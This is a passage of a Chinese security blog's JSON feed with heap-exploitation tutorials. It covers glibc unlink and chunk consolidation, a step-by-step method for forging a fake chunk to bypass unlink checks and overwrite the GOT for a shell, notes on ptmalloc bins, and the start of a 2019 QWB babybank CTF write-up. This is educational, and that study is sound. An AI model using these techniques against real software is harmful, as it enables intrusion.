operator\">-></span>bk<span class=\"token operator\">=</span>BK<span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>P<span class=\"token operator\">-></span>bk</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>BK<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>FD<span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span>P<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>P<span class=\"token operator\">-></span>fd</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 将 P 前后两个 chunk 相连，从而分离中间的 chunk。</span></pre></td></tr></table></figure><h3 id=\"堆块合并\"><a class=\"anchor\" href=\"#堆块合并\">#</a> 堆块合并</h3>\n<h4 id=\"向前合并高地址\"><a class=\"anchor\" href=\"#向前合并高地址\">#</a> 向前合并（高地址）</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 假设这里 p 为 chunk2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 确定堆块合并后的 size</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 通过 pre_size 找到前一个 chunk</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 通过 unlink 合并堆块</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>​\t\t在 free chunk2 的时候。会先检测 chunk3 的 prev_inuse 值。如果为 0，说明 chunk2 已经被 free，直接返回；如果为 1，则会检测 chunk2 的 prev_inuse 值。如果 chunk2 的 prev_inuse 值为 1，说明 chunk1 被占用，则跳过向前合并，如果为 0，会根据 chunk2 的 prev_size 值找到 chunk1，合并这两个堆块，完成向前合并。</p>\n<h4 id=\"向后合并低地址\"><a class=\"anchor\" href=\"#向后合并低地址\">#</a> 向后合并（低地址）</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// 获得下一个 chunk 的 prev_inuse</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 通过 unlink 合并堆块</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// 确定堆块合并后的 size</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>​\t\t在 chunk2 向前合并完成后，会检测下一个堆块是否为 top chunk，如果是，直接与 top chunk 合并；如果不是，继续检测 chunk3 的下一个堆块 chunk4 的 prev_inuse 值，如果为 1，说明 chunk3 被占用，跳过向后合并；如果为 0，合并 chunk3，完成向后合并。</p>\n<h4 id=\"ps\"><a class=\"anchor\" href=\"#ps\">#</a> PS：</h4>\n<ol>\n<li>在堆块合并时，无论向前向后都只合并相邻的堆块，不会继续合并更前或更后的堆块。</li>\n<li>属于 fastbin 大小的堆块在 free 时不会合并，而是直接放入 fastbin。</li>\n</ol>\n<h3 id=\"伪造chunk并绕过unlink检测\"><a class=\"anchor\" href=\"#伪造chunk并绕过unlink检测\">#</a> 伪造 chunk 并绕过 unlink 检测</h3>\n<p>​\t\t可以伪造 chunk 并通过 unlink 来修改 GOT 表从而 getshell。但是 unlink 会对 chunk 的 size 和双向链表完整性进行检查。</p>\n<h4 id=\"size检查\"><a class=\"anchor\" href=\"#size检查\">#</a> size 检查</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span><span class=\"token function\">next_chunk</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted size vs. prev_size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//P 自己包含 size 信息，P 的下一个 chunk 也包含了 P 的 size 信息，将两者进行比较。</span></pre></td></tr></table></figure><h4 id=\"双向链表完整性检查\"><a class=\"anchor\" href=\"#双向链表完整性检查\">#</a> 双向链表完整性检查</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 检查 P 前一个 chunk 的 bk 和后一个 chunk 的 fd 是否都指向 P。</span></pre></td></tr></table></figure><h4 id=\"流程-2\"><a class=\"anchor\" href=\"#流程-2\">#</a> 流程</h4>\n<ol>\n<li>开辟三个堆块 chunk0、chunk1、chunk2。chunk2 应大于 fastbin 的范围。</li>\n<li>在 chunk1 中伪造一个 chunk，并通过 off by null 修改 chunk2 的 prev_size 和 size 来绕过<strong> size 检查</strong>。</li>\n<li>因为伪造的 chunk 并不在链表中，所以让伪造的 chunk 的 fd 和 bk 都指向自己，就能绕过<strong>双向链表完整性检查</strong>。</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 在绕过双向链表完整性检查时，通常按照以下公式设置伪造 chunk 的 fd 和 bk。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fd<span class=\"token operator\">=</span>chunk_addr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bk<span class=\"token operator\">=</span>chunk_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 会有以下效果</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>chunk<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk<span class=\"token operator\">==</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>chunk<span class=\"token operator\">-></span>fd<span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>chunk_addr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>chunk_addr</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>chunk<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>fd<span class=\"token operator\">==</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>chunk<span class=\"token operator\">-></span>bk<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>chunk_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>chunk_addr</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 满足了检查条件</span></pre></td></tr></table></figure><ol start=\"4\">\n<li>\n<p>free chunk2，unlink 会合并伪造的 chunk 和 chunk2。</p>\n</li>\n<li>\n<p>这时 bss 段上对应 chunk2 的指针 ptr 会从 [ptr] 修改为 [&amp;ptr-0x18]，就可以通过编辑 chunk2 对 GOT 表进行修改，改变其他 chunk 的指针。</p>\n<p>chunk2</p>\n<p>presize = 0</p>\n<p>chunk0</p>\n<p>fd: ptr-0x18 bk : ptr-0x10</p>\n<p>chunk1</p>\n</li>\n</ol>\n<h2 id=\"libc229之后\"><a class=\"anchor\" href=\"#libc229之后\">#</a> libc2.29 之后</h2>\n<p>​\t\t值得一提的是，在 libc2.29 之后，glibc 在向前合并时对 presize 添加了检测，导致我们无法修改正常 chunk 的 size，因此无法伪造 prev_size。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 设这里的 p 为 chunk1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__glibc_unlikely</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 这里检测了 chunk0 的 size 和 chunk1 的 prevsize 是否相等</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted size vs. prev_size \t   while consolidating\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">unlink_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>​\t\t按照我们上面的思路，如果我们修改了 chunk2 的 prev_size，使其与伪造的 chunk 的 size 相同，这里会检查 chunk2 的 prev_size 和真正的 chunk1 的 size 是否相同，结果自然是不同的。</p>\n<p>​\t\t如果要伪造一个可以绕过检查的 chunk，需要利用到 largebin 残留的 fd_nextsize 和 bk_nextsize 两个指针，smallbin 残留的 bk 指针，以及 fastbin 的 fd 指针，会更加复杂。</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2022/04/pwn-bins-profiles/",
            "url": "https://www.coldwinds.top/2022/04/pwn-bins-profiles/",
            "title": "bins-profiles",
            "date_published": "2022-04-18T13:32:03.000Z",
            "content_html": "<h1 id=\"堆\"><a class=\"anchor\" href=\"#堆\">#</a> 堆</h1>\n<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 的堆分配器：ptmalloc2，主要通过 malloc/free 来分配和释放内存块。<br />\n不同的线程维护不同的堆称为：per thread arena。<br />\n主线程创建的堆称为：main arena。</p>\n<h2 id=\"chunk结构\"><a class=\"anchor\" href=\"#chunk结构\">#</a> chunk 结构</h2>\n<p>我们一般称 malloc 出来的内存块为 chunk，这个内存块在 ptmalloc 用 malloc_chunk 结构体表示。</p>\n<p>结构体定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  This struct declaration is misleading (but accurate and necessary).</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  It declares a \"view\" into memory allowing access to necessary</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  fields at known offsets from a given base. See explanation below.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  INTERNAL_SIZE_T      prev_size<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Size of previous chunk (if free).  */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  INTERNAL_SIZE_T      size<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* Size in bytes, including overhead. */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> fd<span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* double links -- used only if free. */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">/* Only used for large blocks: pointer to next larger size.  */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> fd_nextsize<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* double links -- used only if free. */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> bk_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p><strong>prev_size</strong>：如果前一个 chunk 是空闲状态，prev_size 储存前一个 chunk 的大小；否则储存前一个 chunk 的数据。</p>\n<p><strong>size</strong>：本 chunk 的大小，必须是 2*SIZE_SZ 的整数倍，后三位分别是：</p>\n<ul>\n<li>NON_MAIN_ARENA（A）：表示该 chunk 属于主分配区（1）或者非主分配区（0）。</li>\n</ul>\n<ul>\n<li>\n<p>IS_MAPPED（M）：记录当前 chunk 是否是由 mmap 分配的，M 为 1 表示该 chunk 是从 mmap 映射区域分配的，否则是从 heap 区域分配的。</p>\n</li>\n<li>\n<p>PREV_INUSE（P）：记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>\n</li>\n</ul>\n<p><strong>fd、bk</strong>：chunk 处于分配时从 fd 字段开始就是用户数据了，chunk 空闲时会被添加到对应的空闲管理链表中。这时 fd、bk 就有其特殊意义：</p>\n<ul>\n<li>fd：指向下一个（非物理相邻）空闲的 chunk。</li>\n<li>bk：指向上一个（非物理相邻）空闲的 chunk。</li>\n</ul>\n<p><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）</p>\n<ul>\n<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>\n<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>\n</ul>\n<p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p>\n</blockquote>\n<h3 id=\"占用和空闲状态下的chunk结构示意图\"><a class=\"anchor\" href=\"#占用和空闲状态下的chunk结构示意图\">#</a> 占用和空闲状态下的 chunk 结构示意图</h3>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/chunk%E7%BB%93%E6%9E%84.png\" alt=\"\" title=\"chunk结构\" /></p>\n<blockquote>\n<p>当 chunk 空闲时，其 M 状态不存在，只有 A、P。</p>\n<p>原本是数据区的地方存储四个指针，指针 fd 指向前一个空闲的 chunk，而 bk 指向后一个空闲的 chunk，plmalloc 通过这两个指针将大小相近的 chunk 连成一个双向链表。</p>\n<p>对于 large bin 中的空闲 chunk，还有两个指针 fd_nextsize 和 bk_nextsize，这两个指针用于加快 large bin 中查找最近匹配的空闲 chunk 。不同的 chunk 链表又是通过 bins 或者 fastbins 来组织。</p>\n</blockquote>\n<blockquote>\n<p>当 chunk 占用时，前两个字段被称为 chunk_header，后面的部分称为 user_data，每次通过 malloc 申请到的内存指针，其实是从 data 开始的。</p>\n<p>因此，虽然存在一个 chunk 指针指向 chunk_header，但真正返回给用户的是指向 user_data 的指针。</p>\n</blockquote>\n<p>一般情况下，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块</p>\n<h2 id=\"bins\"><a class=\"anchor\" href=\"#bins\">#</a> bins</h2>\n<p>bin 链表中指向的是 chunk_header。</p>\n<p>当 chunk 被释放时，会通过一个 bin 链表统一管理，ptmalloc 会根据 chunk 的大小和使用情况，将 chunk 分为 4 种类型。</p>\n<blockquote>\n<ul>\n<li>fastbin：用于管理较小的 chunk。</li>\n<li>smallbin：用于管理中等大小的 chunk。</li>\n<li>largebin：用于管理较大的 chunk。</li>\n<li>unsortedbin：用于管理未整理的 chunk</li>\n</ul>\n</blockquote>\n<h3 id=\"fastbin\"><a class=\"anchor\" href=\"#fastbin\">#</a> fastbin</h3>\n<p>我们在写程序时，经常会申请一些较小的堆块。在没有 fastbin 的情况下，free 掉堆块后，通常会将其与其他堆块合并，导致我们下一次申请同样大小的堆块时，需要重新切割堆块。fastbin 的存在省去了合并和切割的步骤，增加了堆块的使用效率。</p>\n<p>进入 fastbin 的堆块由一个单链表进行管理，后进先出，相同大小的堆块在同一条链上，不同大小的堆块在不同的单链表上，并且，fastbin 中的堆块的 p 位会被保留，以此来防止堆块合并。</p>\n<h3 id=\"unsortedbin\"><a class=\"anchor\" href=\"#unsortedbin\">#</a> unsortedbin</h3>\n<p>一般情况下，当一个堆块被释放时，如果它的大小不属于 fastbin，并且它不和 top chunk 相邻，就会放到 unsortedbin 中。除此之外，还有两个来源：</p>\n<ul>\n<li>\n<p>当一个较大的堆块被分割成两半后，如果剩下的部分大于 MINSIZE 就会被放到 unsorted bin 中。</p>\n</li>\n<li>\n<p>当进行 malloc_consolidate 时，如果不和 top chunk 相邻，可能会把合并后的堆块放到 unsortedbin。</p>\n</li>\n</ul>\n<p>进入 unsortedbin 的堆块由一个双向循环链表进行管理，先进先出。链表中的空闲堆块处于乱序状态，当我们申请堆块时，如果在其他 bin 中没有找到合适的堆块，就会遍历 unsortedbin 寻找，这时会把 unsortedbin 中的堆块根据大小放到对应的 bin 中。</p>\n<h3 id=\"smallbin\"><a class=\"anchor\" href=\"#smallbin\">#</a> smallbin</h3>\n<p>unsortedbin 中大小为 <code>2*SIZE_SZ*index </code>  index∈[2,63] 的堆块会被分配到 smallbin 中。</p>\n<p>进入 smallbin 的堆块由 62 个双向循环链表进行管理，先进先出。相同大小的堆块在同一条链上，不同大小的堆块在不同的链表上。</p>\n<h3 id=\"largebin\"><a class=\"anchor\" href=\"#largebin\">#</a> largebin</h3>\n<p>unsortedbin 中大于等于 <code>512(x32)|1024(x64)</code>  的堆块会被分配到 largebin 中。</p>\n<p>进入 largebin 的堆块由 63 个双向链表进行管理，63 个链表被分为 6 组，每组链表可以储存的堆块大小范围不同，如下图所示：</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220211163451.png\" alt=\"\" /></p>\n<blockquote>\n<p>以 64 位为例：</p>\n<p>第一组第一个 largebin 可以储存大小为 [1024,1024+64) 的堆块。</p>\n<p>第一组第二个 largebin 可以储存大小为 [1024+64,1024+64+64) 的堆块。</p>\n<p>第一组总共有 32 个 largebin。</p>\n<p>依此类推……</p>\n<p>第二组第一个 largebin 可以储存大小为 [3072,3072+512) 的堆块。</p>\n<p>第二组总共有 16 个 largebin。</p>\n<p>依此类推……</p>\n<p>第六组只有一个 largebin，它储存的堆块大小没有限制。</p>\n</blockquote>\n<p>在同一个 largebin 中，堆块的大小是不一定相同的，因此需要使用 fd_nextsize 和 bk_nextsize 两个指针来对不同大小的堆块进行从大到小的排序。</p>\n<h3 id=\"tcache\"><a class=\"anchor\" href=\"#tcache\">#</a> tcache</h3>\n<p>tcache 是在 libc 2.26 后引入的一种新的缓存机制。它为每个线程增加了一个 bin 缓存，从而提高了小内存的分配速度。在释放堆块时，会先检查堆块的大小，确认合法后，在放入 fastbin 之前，会先尝试将它放入 tcache 中。在申请堆块时，会优先使用 tcache 中合适的堆块。</p>\n<p>进入 tcache 的堆块由一个单链表进行管理，后进先出，每个 tcache 中至多有 7 个堆块，并且，tcache 同样保留 p 位，也就是说 tcache 中的堆块不会被合并。</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2022/03/Blockchain-2019qwb-babybank/",
            "url": "https://www.coldwinds.top/2022/03/Blockchain-2019qwb-babybank/",
            "title": "2019-强网杯-babybank",
            "date_published": "2022-03-08T15:41:09.000Z",
            "content_html": "<h1 id=\"2019强网杯babybank\"><a class=\"anchor\" href=\"#2019强网杯babybank\">#</a> 2019 强网杯 babybank</h1>\n<h2 id=\"题目信息\"><a class=\"anchor\" href=\"#题目信息\">#</a> 题目信息</h2>\n<blockquote>\n<p>Get the flag after payforflag event is emitted 0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c@ropsten</p>\n</blockquote>\n<p>在执行完 payforflag 函数后获取 flag，并且给出了题目合约的地址。</p>\n<p>同时给出部分合约源码</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.23</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">babybank</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> level<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token builtin\">uint</span> secret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">//Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">//Gmail is ok. 163 and qq may have some problems.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">event</span> <span class=\"token function\">sendflag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> md5ofteamtoken<span class=\"token punctuation\">,</span><span class=\"token builtin\">string</span> b64email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">//pay for flag</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">payforflag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> md5ofteamtoken<span class=\"token punctuation\">,</span><span class=\"token builtin\">string</span> b64email<span class=\"token 